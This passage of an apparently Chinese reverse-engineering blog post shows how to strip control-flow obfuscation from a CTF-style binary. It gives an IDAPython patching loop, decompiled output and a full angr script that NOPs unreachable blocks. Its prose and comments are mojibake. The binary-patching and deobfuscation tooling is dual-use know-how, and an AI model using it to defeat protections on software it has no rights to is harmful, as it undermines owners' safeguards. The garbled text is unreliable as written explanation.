class="hljs-string">b&#x27;\x41\xBD\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r14d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBE\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r15d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBF\x00\x00\x00\x00&#x27;</span> + pad&#125;<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">å¦‚ä½•ç¡®å®šåªæœ‰è¿™äº›å¯„å­˜å™¨ï¼Ÿ </span><br><span class="hljs-string">å½“ç„¶ä¹Ÿæ˜¯ä½¿ç”¨IDApython å¯ä»¥å…ˆåœ¨ä¸‹é¢çš„reg =idc.print_operand(ref,0)åè¿½åŠ </span><br><span class="hljs-string">regs.add(reg)</span><br><span class="hljs-string">æœ€åå†print(regs)å°±å¯ä»¥å¾—åˆ°äº†</span><br><span class="hljs-string"></span><br><span class="hljs-string">ä¸ºä»€ä¹ˆè¦åŠ ä¸€ä¸ªpadï¼Ÿ</span><br><span class="hljs-string">å¯ä»¥è‡ªå·±æ‰‹åŠ¨patchä¸€ä¸¤ä¸ªï¼Œçœ‹çœ‹patchåå’Œpatchå‰é•¿åº¦æœ‰å•¥åŒºåˆ«å°±çŸ¥é“äº†</span><br><span class="hljs-string"></span><br><span class="hljs-string">ç¡®å® æŒ‰é“ç†æ¥è¯´ è¿™äº›åº”è¯¥ä¹Ÿæœ‰è§„å¾‹çš„ å¯ä»¥ä½¿ç”¨è„šæœ¬æ¥è¡¨ç¤ºçš„ï¼Œè€Œéå­—å…¸</span><br><span class="hljs-string">ä½†æ˜¯ æˆ‘ä¸ä¼š:(</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># å˜é‡å­˜å‚¨åœ°å€æ¯æ¬¡é€’å¢4</span><br><span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ea,end,<span class="hljs-number">4</span>):<br>     ref = ida_xref.get_first_dref_to(addr)<span class="hljs-comment"># å¾—åˆ°æ˜¯å¼•ç”¨æ­¤å˜é‡çš„é¦–è¯­å¥åœ°å€</span><br>     <span class="hljs-keyword">while</span> ref != idaapi.BADADDR:<span class="hljs-comment"># ä¸æœ€åä¸€å¥ä¸€èµ·é…åˆä½¿ç”¨ï¼Œå³å½“å‰å˜é‡ä»æœ‰è¢«ç´¢å¼•</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;mov&#x27;</span> <span class="hljs-keyword">in</span> GetDisasm(ref):<span class="hljs-comment"># è½¬ä¸ºåæ±‡ç¼–ï¼Œç¡®è®¤æ˜¯ä¸æ˜¯movæ“ä½œ</span><br>            reg =idc.print_operand(ref,<span class="hljs-number">0</span>)<span class="hljs-comment"># å¾—åˆ°ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œå¦‚æœæŠŠ0æ”¹ä¸º1ï¼Œå°±æ˜¯å¾—åˆ°ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚è¿™é‡Œæ˜¯è·å¾—æ“ä½œçš„å¯„å­˜å™¨</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;before:&quot;</span>,GetDisasm(ref))<span class="hljs-comment"># patchå‰è¯­å¥</span><br>            idaapi.patch_bytes(ref,patch[reg])<span class="hljs-comment"># ä»æ­¤è¯­å¥å¼€å§‹patchï¼Œpatchå€¼ä¸ºä»¥ä¸Šå­—å…¸æ‰€ç¤º</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,GetDisasm(ref))<span class="hljs-comment"># patchåè¯­å¥</span><br>        ref = ida_xref.get_next_dref_to(addr,ref)<span class="hljs-comment"># å¾—åˆ°å¼•ç”¨æ­¤å˜é‡çš„ä¸‹ä¸€æ¡è¯­å¥åœ°å€ è‹¥æ²¡æœ‰ åˆ™è¿”å› -1</span><br><br></code></pre></td></tr></table></figure><p>patchå®Œæˆä¹‹åï¼ŒCFGè¿˜æ˜¯é‚£ä¸ªCFGï¼Œä½†æ˜¯åç¼–è¯‘å·²ç»æˆåŠŸå»æ··æ·†äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">start_quest</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *a1)</span><br>&#123;<br>  _BYTE v2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-90h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+48h] [rbp-48h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v5; <span class="hljs-comment">// [rsp+50h] [rbp-40h]</span><br>  <span class="hljs-type">int</span> *v6; <span class="hljs-comment">// [rsp+58h] [rbp-38h]</span><br>  _BYTE *v7; <span class="hljs-comment">// [rsp+60h] [rbp-30h]</span><br>  _BYTE *v8; <span class="hljs-comment">// [rsp+68h] [rbp-28h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v9; <span class="hljs-comment">// [rsp+70h] [rbp-20h]</span><br><br>  v9 = a1;<br>  v8 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v7 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v6 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v5 = &amp;v2[<span class="hljs-number">-16</span>];<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::length(v9) - <span class="hljs-number">1LL</span> != legend &gt;&gt; <span class="hljs-number">2</span> )<br>  &#123;<br>    *v6 = legend &gt;&gt; <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-built_in">string</span>(v5, v9);<br>    v3 = sanitize_input(v5);<br>    *v6 = v3;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::~<span class="hljs-built_in">string</span>(v5);<br>  &#125;<br>  <span class="hljs-keyword">return</span> *v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼šå‘ç°ï¼Œä»£ç é€»è¾‘å·²ç»ååˆ†æ¸…æ™°äº†ã€‚</p><h4 id="æ€è·¯äºŒ-Angrç¬¦å·æ‰§è¡Œ"><a href="#æ€è·¯äºŒ-Angrç¬¦å·æ‰§è¡Œ" class="headerlink" title="æ€è·¯äºŒ Angrç¬¦å·æ‰§è¡Œ"></a>æ€è·¯äºŒ Angrç¬¦å·æ‰§è¡Œ</h4><p>å‰é¢æå³ï¼Œé‚£äº›æ§åˆ¶å˜é‡çš„æ¡ä»¶æ˜¯ç¡®å®šçš„ï¼Œä¹Ÿå°±æ˜¯å“ªäº›èµ°ã€å“ªäº›åœ°æ–¹ä¸èµ°æ˜¯ç¡®å®šï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠä¸èµ°çš„åœ°æ–¹ç»™nopæ‰ï¼Œä¸ä¹Ÿå¯è¾¾åˆ°å»æ··æ·†çš„ç›®çš„å—ï¼Ÿ</p><p>é‚£é—®é¢˜åœ¨äºï¼Œæˆ‘ä»¬å¦‚ä½•ç¡®å®šå“ªäº›å—è¯¥èµ°ï¼Œå“ªäº›å—ä¸è¯¥èµ°å‘¢ï¼Ÿ IDApythonæˆ–è®¸ä¹Ÿå¯ä»¥ä¸€è¯•ï¼Œæ¯•ç«Ÿè¿™ä¹Ÿæ˜¯é‡å¤æ€§çš„æ´»ï¼Œä¸è¿‡è¿™æ—¶å€™è§„å¾‹æ€§å°±æ²¡é‚£ä¹ˆæ˜æ˜¾äº†ï¼Œè„šæœ¬å°±ä¸æ˜¯å¾ˆå¥½å†™äº†ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰Angrè¿™ä¸€ä¸ªå¸®æ‰‹å‘€ï¼Œå®ƒä¸å°±æ˜¯ä¸€æ­¥ä¸€æ­¥å¸®æˆ‘ä»¬æ¢ç´¢å˜›ï¼Œé‚£åªè¦æŠŠå®ƒæ²¡æœ‰èµ°åˆ°çš„å—ç»™nopæ‰ä¸å°±å¥½äº†å˜›</p><p>ç›´æ¥çœ‹è„šæœ¬å§ï¼Œè„šæœ¬é™„æœ‰è¯¦ç»†æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># ç”¨äºè®°å½•æ‰€æœ‰çš„å—</span><br>Blocks = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-comment"># å¾—åˆ°CFGï¼Œä½†æ³¨æ„æ­¤å¤„çš„CFGæ˜¯å‡½æ•°è°ƒç”¨CFGï¼Œä¹Ÿå³ä¸€ä¸ªCallä¼šæ˜¯ä¸€ä¸ªblockçš„ç»ˆæ­¢ï¼Œä¸IDAçš„CFGæœ‰æ‰€ä¸åŒï¼Œä½†æ— ä¼¤å¤§é›…</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GetCFG</span>(<span class="hljs-params">func_addr</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Getting CFG&quot;</span>)<br>    cfg = proj.analyses.CFGFast(normalize = <span class="hljs-literal">True</span>,force_complete_scan = <span class="hljs-literal">False</span>)<span class="hljs-comment"># ä½¿ç”¨CFGFastå¾—åˆ°é™æ€CFG</span><br>    function_cfg = cfg.functions.get(func_addr).transition_graph<span class="hljs-comment"># å¾—åˆ°å‡½æ•°è°ƒç”¨CFG</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Getting CFG Done&quot;</span>)<br>    <span class="hljs-keyword">return</span> function_cfg<br><br><br><span class="hljs-comment"># å¾—åˆ°æ‰€æœ‰çš„å—</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GetBlock</span>(<span class="hljs-params">cfg</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Getting Block &quot;</span>)<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> cfg.nodes:<br>        Blocks.add(node.addr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Getting Block Done&quot;</span>)<br><br>    <br><span class="hljs-comment"># Hookæ‰æ‰€æœ‰callçš„å‡½æ•°ï¼Œè®©ä»–ä»¬è¿”å›æœªçº¦æŸçš„å€¼ï¼Œä»¥å…é™·å…¥å¤æ‚çš„åº“å‡½æ•°ä¸­</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Hook</span>(<span class="hljs-params">block</span>):<br>    <span class="hljs-keyword">for</span> insn <span class="hljs-keyword">in</span> block.capstone.insns: <span class="hljs-comment">#è¯¥å—çš„æ‰€æœ‰æ±‡ç¼–è¯­å¥</span><br>        <span class="hljs-keyword">if</span> insn.mnemonic == <span class="hljs-string">&#x27;call&#x27;</span>:<span class="hljs-comment"># æ±‡ç¼–æ“ä½œæŒ‡ä»¤ä¸º call çš„</span><br>            src_Addr = <span class="hljs-built_in">int</span>(insn.op_str,<span class="hljs-number">16</span>)<span class="hljs-comment"># å¾—åˆ°æ“ä½œæ•°ï¼Œå³callçš„åœ°å€</span><br>            proj.hook(src_Addr,angr.SIM_PROCEDURES[<span class="hljs-string">&quot;stubs&quot;</span>][<span class="hljs-string">&quot;ReturnUnconstrained&quot;</span>](), replace=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-comment"># patch æ— æ³•æ‰§è¡Œçš„Block</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Patch</span>(<span class="hljs-params">block</span>):<br>    start = block.addr - proj.loader.main_object.mapped_base<br>    size = block.size<br>    oridata[start : start + size] = <span class="hljs-string">b&#x27;\x90&#x27;</span> * size<br>    <br><br><span class="hljs-comment"># å†™å…¥patchåçš„æ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Write</span>(<span class="hljs-params">oridata</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Wtring File&quot;</span>)<br>    fname, suffix = os.path.splitext(file)<br>    newname = fname +<span class="hljs-string">&#x27;_patched&#x27;</span> + suffix<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(newname,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> newfile:<br>        newfile.write(oridata)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Wtring Done&quot;</span>)<br><br><span class="hljs-comment"># ç¬¦å·æ‰§è¡Œæ‰¾åˆ°ä¸å¯è¾¾çš„Block</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deobfu_func</span>(<span class="hljs-params">func_addr</span>):<br>    state = proj.factory.blank_state(addr = func_addr)<br>    simgr = proj.factory.simgr(state)<br>    <span class="hljs-comment"># é‡‡ç”¨stepæ–¹å¼ä¸€æ­¥ä¸€æ­¥èµ°ï¼Œä¸€ç›´åˆ°ç»ˆæ­¢</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(simgr.active):<br>        <span class="hljs-keyword">for</span> active <span class="hljs-keyword">in</span> simgr.active:<br>            <span class="hljs-comment">#æŠŠå¯ä»¥åˆ°è¾¾çš„blockèˆå¼ƒæ‰</span><br>            Blocks.discard(active.addr)<br>            <span class="hljs-comment">#æŠŠå½“å‰activeè½¬ä¸ºblockï¼Œå¹¶Hookæ‰é‡Œé¢çš„callå‡½æ•°</span><br>            block = proj.factory.block(active.addr)<br>            Hook(block)<br>        simgr.step()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Patching&quot;</span>)<br>    <span class="hljs-comment">#æ­¤æ—¶ä»åœ¨Blocksé‡Œé¢çš„ï¼Œå³ä¸ºä¸å¯æ‰§è¡Œå—ï¼Œpatchæ‰</span><br>    <span class="hljs-keyword">for</span> block_addr <span class="hljs-keyword">in</span> Blocks:<br>        Patch(proj.factory.block(block_addr))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Patching Done&quot;</span>)<br>    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># å‡†å¤‡ä¸€äº›å¿…è¦å‚æ•° æ–‡ä»¶åœ°å€ ä»¥åŠ å»æ··æ·†çš„èµ·å§‹åœ°å€</span><br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File to deobfuscate&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--start&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">int</span>(x, <span class="hljs-number">0</span>), <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Starting address of target function&#x27;</span>)<br>    args = parser.parse_args()<br><br>    file = args.file<br>    start = args.start<br>    <br><span class="hljs-comment">#è£…è½½äºŒè¿›åˆ¶æ–‡ä»¶</span><br>    proj = angr.Project(file,auto_load_libs=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment">#è·å¾—åŸæ¥çš„äºŒè¿›åˆ¶æ•°æ® ä¸ºpatchåšå‡†å¤‡</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> orifile:<br>        oridata = <span class="hljs-built_in">bytearray</span>(orifile.read())<br><br>    func_cfg = GetCFG(start)<br>    GetBlock(func_cfg)<br>    deobfu_func(start)<br><br>    Write(oridata)<br><br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ¯ç¬¦å·æ‰§è¡Œä¸€æ¬¡ï¼Œåªèƒ½æ¸…é™¤ä¸€ä¸ªå‡½æ•°çš„æ··æ·†ï¼Œå¦‚æœæœ‰å¤šä¸ªå‡½æ•°éœ€è¦æ¸…æ¥šæ··æ·†ï¼Œå°±è¦é‡å¤æ‰§è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">start_quest</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *a1)</span><br>&#123;<br>  _BYTE v2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-90h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+48h] [rbp-48h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v5; <span class="hljs-comment">// [rsp+50h] [rbp-40h]</span><br>  <span class="hljs-type">int</span> *v6; <span class="hljs-comment">// [rsp+58h] [rbp-38h]</span><br>  _BYTE *v7; <span class="hljs-comment">// [rsp+60h] [rbp-30h]</span><br>  _BYTE *v8; <span class="hljs-comment">// [rsp+68h] [rbp-28h]</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> *v9; <span class="hljs-comment">// [rsp+70h] [rbp-20h]</span><br><br>  v9 = a1;<br>  v8 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v7 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v6 = &amp;v2[<span class="hljs-number">-16</span>];<br>  v5 = &amp;v2[<span class="hljs-number">-16</span>];<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_100);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span 